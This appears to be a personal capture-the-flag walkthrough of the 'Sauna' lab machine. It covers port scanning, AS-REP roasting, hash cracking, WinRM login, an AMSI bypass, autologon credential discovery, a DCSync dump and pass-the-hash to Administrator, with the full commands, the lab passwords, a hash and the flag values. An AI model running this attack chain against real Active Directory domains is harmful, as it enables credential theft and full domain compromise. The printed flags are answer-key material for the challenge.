![[Pasted image 20250705204213.png]]
# Enumeration 
Enumerate all open ports
```bash
sudo nmap -p- --min-rate 10000 -oA nmap/massive_scan 10.129.197.50
Nmap scan report for 10.129.197.50 (10.129.197.50)
Host is up (0.026s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49698/tcp open  unknown
49717/tcp open  unknown

```


Get all ports number
```bash
grep "Ports:" massive_scan.gnmap | sed 's/.*Ports: //' | tr ',' '\n' | grep open | cut -d '/' -f1 >> ../open_ports.txt
```

use default script scan on the open ports
```bash
sudo nmap -sCV -p $(paste -sd, open_ports.txt | tr -d ' /r') -T4 -A -oA nmap/open_ports 10.129.197.50
```

- Domain `EGOTISTICAL-BANK.LOCAL`
- host `SAUNA`


List of user in `http://10.129.197.50/about.html`
![[Pasted image 20250705170237.png]]

```text
Fergus Smith
Hugo Bear
Steven Kerb
Shaun Coins
Bowie Taylor
Sophie Driver
```

# Foothold



Ho usato [username-anarchy](https://github.com/urbanadventurer/username-anarchy) per creare una lista di possibili username

```bash
./username-anarchy -i fullnames.txt -o username.txt
```

now we can check if anyone of this users have the `Kerberos pre-authntication` disable. If is disable anyone can send a AS_REQ reuqets to the KDC and receive an AS_REP message. This AS_REP contains information encrypted with user's NTLM hash. This encrypted part of the AS_REP cna then be used for carcking the passoword be exploited. 

In this case we can user the  `GetNPUsers.py` script from impacker

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile possible_usernames.txt -dc-ip 10.129.197.50 -no-pass -request -format hashcat -outputfile preauth.txt
```

```bash
cat preauth.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5a140dc99de73f3e63e6288ded059c8d$3c46c0bf4c7ca23378f17d55968088984ac84665c2a00e4bcb55d1e10deb12da86ba54d644b769d4f62c5a7535e42688e98d355a33c74c1625900722d01f33fd1d85d5f6888b49a787efd776688c0fd8b83adbaa5826d37a9caeb241f0a19216c0f370657174215c1702530891eecf84468ecf2fe0d03d95428d9eda698880aca65bf79f4cf420c08c2cb9d1052e7988fb21711d4a016100cf521395db9770052f708d3a307aaaba916def669ed265d2a37c3c3673b602ed347f8d83dc9a0c4afb454f55a90f8c705b67657bd835272cff1a241346c44b42cffdcac485c916b6019a648e35394dea9e9fec37e94fa62d17985df312bebbc3aa5182fdf1204ad5
```


we can seethe for the fsmith we have receive the AS_REP that can be crack using hashcat. With the `18200` module 

```bash
hashcat -m 18200 preauth.txt /usr/share/wordlists/rockyou.txt
```

```bash
hashcat --show preauth.txt
```

![[Pasted image 20250705173637.png]]

Now we know the user format is first name letter and surname `fsmith` and we have the password for this specific user.

Access to the machine using `evil-winrm` 
```bash
evil-winrm -u fsmith -p Thestrokes23 --ip EGOTISTICAL-BANK.LOCAL
```

![[Pasted image 20250705181309.png]]
now under the user's desktop we can get the user flag.

# Privilege Escalation


Now run `Bypass-4MSI` script and import [WinPeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20250701-bdcab634) on the target machine

![[Pasted image 20250705193429.png]]

after run winPeas i found the `AutoLogon credentials`

![[Pasted image 20250705194803.png]]

The script reveals that the user `EGOTISTICALBANK\svc_loanmanager` has been set to automatically log in, and this account has the password `Moneymakestheworldgoround!` . 
Examination of `C:\Users\` confirms that the similarly named `svc_loanmgr` has logged on locally.

```bash
evil-winrm --ip EGOTISTICAL-BANK.LOCAL -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```
![[Pasted image 20250705200010.png]]


run `bloodhound` for the `svc_loanmgr` user
```bash
bloodhound-python -u svc_loanmanager -p Moneymakestheworldgoround! -ns 10.129.197.50 -d EGOTISTICAL-BANK.LOCAL -c all
```


run the bloodhound GUI
```bash
# remove precedent session
sudo docker-compose down
sudo docker volume ls
sudo docker volume rm <name>


sudo docker-compose pull && sudo docker-compose up
```

![[Pasted image 20250705201015.png]]
![[Pasted image 20250705201117.png]]

```bash
secretsdump.py egotistical-bank.local/svc_loanmgr@10.129.197.50 -just-dc-user Administrator
```

![[Pasted image 20250705203852.png]]

```bash
psexec.py egotistical-bank.local/administrator@10.129.197.50 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

under the `c:\Users\Administrator\Desktop` we can found the root flag

# Loot

| user        | pwd                        |
| ----------- | -------------------------- |
| fsmith      | Thestrokes23               |
| svc_loanmgr | Moneymakestheworldgoround! |


| name     | flags                            |
| -------- | -------------------------------- |
| user.txt | 669c0faec5871fa714a743135ea789bb |
| root.txt | 8909768e697abc52ee53c4848757e6af |

